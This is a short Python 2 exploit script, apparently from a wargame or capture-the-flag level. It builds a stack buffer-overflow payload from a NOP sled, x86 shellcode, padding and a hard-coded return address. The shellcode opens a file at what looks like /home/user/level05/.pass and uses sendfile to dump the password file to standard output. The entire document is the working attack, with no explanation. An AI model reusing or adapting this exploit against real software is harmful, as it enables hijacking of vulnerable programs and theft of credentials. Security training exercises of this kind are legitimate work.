import struct

SHELLCODE = b"jsh.pashl05/hlevehers/he/ush/hom\x89\xe31\xc9j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\x00\x00\x01\x00^1\xc0\xb0\xbb\xcd\x80"

exploit = '\x90'*(128 - len(SHELLCODE)) + SHELLCODE

exploit += 'A'*28
exploit += struct.pack("I", 0xffffd670 + 0x20)

print exploit